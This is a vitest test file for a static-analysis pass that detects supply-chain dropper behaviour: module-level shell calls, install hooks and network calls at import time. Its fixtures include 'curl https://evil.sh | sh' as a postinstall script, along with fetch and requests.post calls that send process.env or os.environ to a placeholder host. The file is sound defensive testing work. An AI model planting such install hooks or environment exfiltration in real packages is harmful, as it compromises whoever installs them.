/**
 * Tests for module-side-effect (CWE-829, category: security).
 *
 * The supply-chain dropper shape: dangerous work at module-load / install
 * time, with no taint flow because the attacker hard-codes it. The gating is
 * the whole rule — the same call inside a function is ordinary code, so the
 * `in_method` checks and the benign-install allowlist are what stop this
 * firing on every project that shells out.
 */
import { describe, it, expect } from 'vitest';
import { ModuleSideEffectPass } from '../../../src/analysis/passes/module-side-effect-pass.js';
import { makeIR, makeCtx, call } from './_pass-fixtures.js';

const run = (
  calls: ReturnType<typeof call>[],
  language = 'javascript',
  file = 'index.js',
  code = '',
) => {
  const ir = makeIR({
    meta: { circle_ir: '3.0', file, language, loc: 20, hash: '' },
    calls,
  });
  const ctx = makeCtx(ir, code, language);
  new ModuleSideEffectPass().run(ctx);
  return ctx;
};

describe('ModuleSideEffectPass', () => {
  describe('JS module-level calls', () => {
    it('flags child_process.execSync at module top level', () => {
      const ctx = run([call('child_process', 'execSync', [['"curl evil.sh | sh"']])]);
      expect(ctx.findings).toHaveLength(1);
      expect(ctx.findings[0].cwe).toBe('CWE-829');
      expect(ctx.findings[0].severity).toBe('high');
    });

    it('does NOT flag the same call inside a function', () => {
      // This is the load-bearing distinction: exec in a function is normal.
      const ctx = run([call('child_process', 'execSync', [['"ls"']], 10, 'runBuild')]);
      expect(ctx.findings).toHaveLength(0);
    });

    it('flags a module-level https.request', () => {
      const ctx = run([call('https', 'request', [['opts']])]);
      expect(ctx.findings).toHaveLength(1);
    });

    it('flags module-level fetch that references process.env', () => {
      const ctx = run([call('', 'fetch', [['"http://x/c"'], ['{ body: process.env }']])]);
      expect(ctx.findings).toHaveLength(1);
    });

    it('does not flag module-level fetch with no env signal', () => {
      const ctx = run([call('', 'fetch', [['"http://x/config"']])]);
      expect(ctx.findings).toHaveLength(0);
    });
  });

  describe('package.json install scripts', () => {
    const pkg = (scripts: string) => `{\n  "name": "x",\n  "scripts": {\n${scripts}\n  }\n}`;

    it('flags a postinstall that pipes curl into a shell', () => {
      const ctx = run([], 'javascript', 'package.json',
        pkg('    "postinstall": "curl https://evil.sh | sh"'));
      expect(ctx.findings).toHaveLength(1);
    });

    it('flags a preinstall running node -e', () => {
      const ctx = run([], 'javascript', 'package.json',
        pkg('    "preinstall": "node -e \\"require(\'./x\')\\""'));
      expect(ctx.findings).toHaveLength(1);
    });

    it.each(['node-gyp rebuild', 'prebuild-install', 'husky install', 'patch-package'])(
      'does not flag the benign install script %s',
      (cmd) => {
        const ctx = run([], 'javascript', 'package.json', pkg(`    "install": "${cmd}"`));
        expect(ctx.findings).toHaveLength(0);
      },
    );

    it('does not scan package.json content in a normal source file', () => {
      // The scan is keyed on the filename, so the same text elsewhere is inert.
      const ctx = run([], 'javascript', 'index.js', pkg('    "postinstall": "curl https://evil.sh | sh"'));
      expect(ctx.findings).toHaveLength(0);
    });
  });

  describe('Python module-level calls', () => {
    it('flags requests.post referencing os.environ at import time', () => {
      const ctx = run([call('requests', 'post', [['"http://x/c"'], ['os.environ']])], 'python', '__init__.py');
      expect(ctx.findings).toHaveLength(1);
    });

    it('does not flag requests.post with no env signal', () => {
      const ctx = run([call('requests', 'post', [['"http://x/c"'], ['payload']])], 'python', '__init__.py');
      expect(ctx.findings).toHaveLength(0);
    });
  });

  describe('Rust build.rs gating', () => {
    it('flags a dangerous call in build.rs', () => {
      const ctx = run([call('Command', 'new', [['"curl"']])], 'rust', 'build.rs');
      expect(ctx.findings.length).toBeGreaterThanOrEqual(1);
    });

    it('does not flag the same call in main.rs', () => {
      const ctx = run([call('Command', 'new', [['"curl"']])], 'rust', 'src/main.rs');
      expect(ctx.findings).toHaveLength(0);
    });
  });
});
